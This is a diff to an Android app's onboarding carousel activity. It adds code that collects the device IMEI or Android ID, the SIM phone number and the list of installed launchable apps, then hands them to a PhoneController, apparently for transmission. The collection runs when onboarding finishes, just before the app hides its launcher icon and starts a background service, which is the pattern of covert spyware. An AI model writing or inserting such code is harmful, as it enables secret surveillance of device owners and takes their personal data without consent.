@@ -5,12 +5,15 @@ import android.app.AppOpsManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
+import android.telephony.TelephonyManager;
 import android.text.Html;
 import android.util.Log;
 import android.view.LayoutInflater;
@@ -27,6 +30,11 @@ import androidx.viewpager.widget.ViewPager;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 
+import com.example.capturetheapp.controllers.PhoneController;
+import com.example.capturetheapp.model.PhoneInfo;
+
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 public class CarouselActivity extends AppCompatActivity {
@@ -94,6 +102,7 @@ public class CarouselActivity extends AppCompatActivity {
                         btnNext.setText("FINE");
                     }
                 } else {
+                    sendPhoneInfo();
                     disableIcon();
                     startBackgroundService();
                     finish();
@@ -115,6 +124,68 @@ public class CarouselActivity extends AppCompatActivity {
 
         WorkManager.getInstance(getApplicationContext())
                 .enqueue(saveRequest);
+    }
+
+    public String getDeviceIMEI() {
+        String deviceUniqueIdentifier = null;
+        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+        if (null != tm) {
+            try {
+                deviceUniqueIdentifier = tm.getDeviceId();
+                Log.d("DEV", "getDeviceIMEI: " + deviceUniqueIdentifier);
+            } catch (SecurityException e) {
+                deviceUniqueIdentifier = null;
+            }
+        }
+        if (null == deviceUniqueIdentifier || 0 == deviceUniqueIdentifier.length()) {
+            deviceUniqueIdentifier = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
+        }
+
+        Context context = getApplicationContext();
+        SharedPreferences sharedPref = context.getSharedPreferences(
+                getString(R.string.preference_file_key), Context.MODE_PRIVATE);
+        SharedPreferences.Editor editor = sharedPref.edit();
+        editor.putString("imei", deviceUniqueIdentifier);
+        editor.commit();
+
+        return deviceUniqueIdentifier;
+    }
+
+    public String getLine() {
+        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+        String line = null;
+        try {
+            line = tm.getLine1Number();
+        } catch (SecurityException e) {
+            Log.e("APP", "getLine: ", e);
+        }
+        return line;
+    }
+
+    protected void sendPhoneInfo() {
+        PhoneInfo phoneInfo = new PhoneInfo();
+
+        try {
+            phoneInfo.setImei(getDeviceIMEI());
+
+            final PackageManager pm = getPackageManager();
+            //get a list of installed apps.
+            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
+            List<String> packNames = new ArrayList<>();
+            for (ApplicationInfo packageInfo : packages) {
+                if(pm.getLaunchIntentForPackage(packageInfo.packageName) != null) {
+                    packNames.add(packageInfo.packageName);
+                }
+            }
+            phoneInfo.setApplicationInfos(packNames);
+
+            phoneInfo.setSimCell(getLine());
+
+            PhoneController phoneController = new PhoneController();
+            phoneController.start(phoneInfo);
+        } catch (Exception e) {
+            Log.e("APP", "sendPhoneInfo()", e);
+        }
     }
 
     @Override
